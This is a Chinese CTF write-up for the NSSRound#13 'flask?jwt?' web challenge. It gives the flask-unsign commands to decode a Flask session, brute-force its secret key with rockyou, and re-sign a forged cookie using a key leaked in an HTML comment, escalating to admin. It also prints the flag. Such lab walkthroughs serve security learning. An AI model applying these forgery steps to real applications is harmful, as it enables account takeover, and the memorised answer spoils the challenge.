---
date: 2026-11-21 20:45:00
slug: nssround13-flask-jwt
categories:
  - Web
  - 会话伪造
---

# [NSSRound#13 Basic] flask?jwt? — 先分清它是谁

> **题目类型**：Flask session 伪造（签名密钥泄露）
>
> **Flag**：`NSSCTF{d7cbf6c8-fe25-4fe9-a1ea-18248a2e7262}`

---

## 题目概述

**题名本身就是提示：`flask?jwt?`——它在问你，这个 session 到底是 Flask 的还是 JWT 的。**

**这两者长得像（都是一串点分段的 base64），但**处理方式完全不同**：**

```
JWT             三段，第一段是 {"alg":"HS256",...}
Flask session   三段或四段，解出来是 {"_fresh":true,...}
```

**先分辨清楚，再决定用哪套工具——这一步能省掉大量瞎试。**

---

## 解题过程

### Step 1：注册个账号，看 session

**随便注册、登录，抓包看 cookie：**

```text
session=eyJfZnJlc2giOnRydWUs...
```

**它是三段式，而且解出来是 Python 字典的键名（`_fresh`、`_user_id`）——这是 Flask 的 session，不是 JWT。**

**用 flask-unsign 解：**

```powershell
flask-unsign --decode --cookie "<cookie>"
```

```python
{'_fresh': True,
 '_id': 'ae8e9db8fb729eeafed37232050214fccc9622e0659ecd9f43975a2a49ca9e26c0f81ca580bf3fe07a890e68021b5b54fffe0e2bc8cb86a30e503a402acbbd02',
 '_user_id': '2'}
```

**三个键：**

```
_fresh    这次是不是刚登录的
_id       会话 id（Flask-Login 用来绑定会话）
_user_id  当前用户编号 ← 要改的就是它
```

### Step 2：点“获取 flag”，提示不是 admin

**说明后端在判断 `_user_id` 是不是 1。**

**那就把 `'2'` 改成 `'1'`。**

### Step 3：直接改值没用——它是签名过的

**Flask 的 session 是**签名 cookie**：内容放在客户端，但签名在服务端校验。**

**改了内容、签名对不上，服务端直接丢弃整个 session，表现得像“你没登录”。**

**所以必须**重新签名**，而这需要 `SECRET_KEY`。**

### Step 4：一边爆破，一边找提示

```powershell
flask-unsign --unsign --cookie "<cookie>" --wordlist E:\dsh\flask\rockyou.txt --no-literal-eval
```

**`--no-literal-eval` 是必须的**：rockyou 里有纯数字行（比如 `123456`），默认会被当 Python 字面量解析成整数，然后报 `Secret must be a string`，爆破直接中断。

**注意这一步是**并行**的——爆破同时去翻页面。**

**在“忘记密码”页面的 HTML 源码末尾，看到一行注释：**

```html
<!-- secretkey: th3flaskisfunny -->
```

**密钥直接写在页面注释里。**

**`Ctrl + C` 停掉爆破——不用等了。**

### Step 5：用密钥重签

```powershell
flask-unsign --sign --cookie "{'_fresh':True,'_id':'ae8e9db8...503a402acbbd02','_user_id':'1'}" --secret "th3flaskisfunny"
```

**三个必须注意的：**

```
① 整个字典都要写，不能只写 _user_id
   _fresh 和 _id 缺了，Flask-Login 认为会话不完整，直接不认
② 值保持字符串：'1' 而不是 1
③ PowerShell 里用双引号包整块，里面用单引号
```

**把输出的值替换 cookie，刷新页面再点一次“获取 flag”：**

```text
NSSCTF{d7cbf6c8-fe25-4fe9-a1ea-18248a2e7262}
```

---

| 关键点 | 说明 |
| --- | --- |
| 判断类型 | 解第一段：`{"alg":...}` 是 JWT，`{"_fresh":...}` 是 Flask |
| Flask session | 内容在客户端，签名在服务端，改值必须重签 |
| 三个键 | `_fresh` / `_id` / `_user_id`，重签时一个都不能少 |
| 爆破参数 | `--no-literal-eval`（否则数字行会中断爆破） |
| 密钥来源 | 页面 HTML 注释：`<!-- secretkey: th3flaskisfunny -->` |
| 提权动作 | `_user_id` 从 2 改成 1 |

---

??? note "完整流程"

    ```powershell
    # ① 解码
    flask-unsign --decode --cookie "<cookie>"

    # ② 爆破（可被下面的源码提示中断）
    flask-unsign --unsign --cookie "<cookie>" --wordlist E:\dsh\flask\rockyou.txt --no-literal-eval

    # ③ 用泄露的密钥重签
    flask-unsign --sign --cookie "{'_fresh':True,'_id':'ae8e...','_user_id':'1'}" --secret "th3flaskisfunny"
    ```

??? note "这题踩的坑"

    **① 把 Flask session 当 JWT 打**

    **jwt_tool 会直接报 `Not 3 parts`（四段）或解析出一堆 `_fresh` 之类的键。**两个工具不通用，先判断再选。

    **② 在 rockyou 上干等**

    1400 万行要跑很久。**`--no-literal-eval` 不加还会直接崩。**正确做法是**同时翻页面**——这题的密钥就在注释里。

    **③ 只写 `_user_id` 去签名**

    Flask-Login 需要 `_fresh` 和 `_id`，缺一个就判会话无效。**重签是“整块重写”，不是“打补丁”。**

    **④ 写成 `1` 而不是 `'1'`**

    类型不一致，比较可能失败。**原来是什么类型就保持什么类型。**
